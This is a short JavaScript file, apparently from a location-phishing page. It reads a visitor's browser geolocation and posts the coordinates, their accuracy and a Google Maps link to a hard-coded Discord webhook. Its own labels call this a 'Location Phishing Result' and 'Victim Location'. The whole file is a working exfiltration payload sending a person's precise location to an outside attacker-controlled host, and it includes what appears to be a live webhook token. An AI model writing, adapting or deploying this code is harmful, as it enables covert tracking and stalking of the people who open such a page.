const webhookURL = "https://discord.com/api/webhooks/1298106884514910229/PBDKokWcVPpeFlzFiDnU1qxU7EIaHYirj0fWcltWIYQl2gIEhQTJJra4jJCaZ2PoXNdd";

navigator.geolocation.getCurrentPosition(function(position) {
  const lat = position.coords.latitude.toFixed(6);
  const lon = position.coords.longitude.toFixed(6);
  const acc = position.coords.accuracy.toFixed(2);

  const data = {
    content: "** Location Phishing Result**",
    embeds: [{
      title: "Victim Location",
      color: 15258703,
      fields: [
        { name: "Latitude", value: lat, inline: true },
        { name: "Longitude", value: lon, inline: true },
        { name: "Accuracy", value: `${acc} meters`, inline: true },
        { name: "Map", value: `https://www.google.com/maps?q=${lat},${lon}` }
      ],
      timestamp: new Date()
    }]
  };

  fetch(webhookURL, {
    method: 'POST',
    body: JSON.stringify(data),
    headers: { 'Content-Type': 'application/json' }
  });

  document.getElementById("status").textContent = " Location sent.";
}, function(error) {
  document.getElementById("status").textContent = " Location error: " + error.message;
});
